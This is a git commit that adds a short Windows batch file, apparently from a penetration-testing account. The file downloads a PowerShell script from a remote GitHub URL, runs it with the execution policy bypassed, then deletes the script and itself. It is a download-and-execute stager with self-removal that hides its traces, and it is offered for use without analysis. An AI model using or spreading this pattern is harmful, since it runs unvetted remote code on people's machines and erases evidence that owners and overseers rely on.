481488b8ff76c646dccc2430bf868b770d4954f8
Opabinia <144001335+pentestfunctions@users.noreply.github.com>
2023-11-19 04:37:51 +1300

    Create file_to_execute.bat

---
+++ file_to_execute.bat
@@ -0,0 +1,15 @@
+@echo off
+set SCRIPT_URL=https://raw.githubusercontent.com/HFScripts/hookguesser/main/guesser.ps1
+set SCRIPT_NAME=guesser.ps1
+
+REM Download the script
+powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %SCRIPT_NAME%"
+
+REM Run the script
+powershell -ExecutionPolicy Bypass -File %SCRIPT_NAME%
+
+REM Clean up the script
+del %SCRIPT_NAME%
+
+REM Delete this batch file. %0 refers to the current script.
+del %0
